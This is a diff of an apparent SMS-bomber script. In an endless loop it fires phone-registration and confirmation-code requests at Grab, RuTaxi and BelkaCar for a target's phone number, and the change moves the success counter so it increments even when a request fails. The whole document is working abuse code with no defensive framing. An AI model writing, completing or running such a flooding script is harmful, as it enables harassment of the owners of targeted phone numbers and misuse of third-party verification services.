@@ -152,23 +152,22 @@ while True:
 
 
 	try:
+                success+=1
 		requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
 		print('[+] Grab Requests Successful!')
-                success+=1
 	except:
 		print('[-] Grab Requests Failed!')
-                success+=1
 	try:
+                success+=1
 		requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
 		print('[+] RuTaxi Requests Successful!')
-                success+=1
 	except:
 		print('[-] RuTaxi Requests Failed!')
 
 	try:
+                success+=1
 		requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
 		print('[+] BelkaCar Requests Successful!')
-                success+=1
 	except:
 		print('[-] BelkaCar Requests Failed!')
 
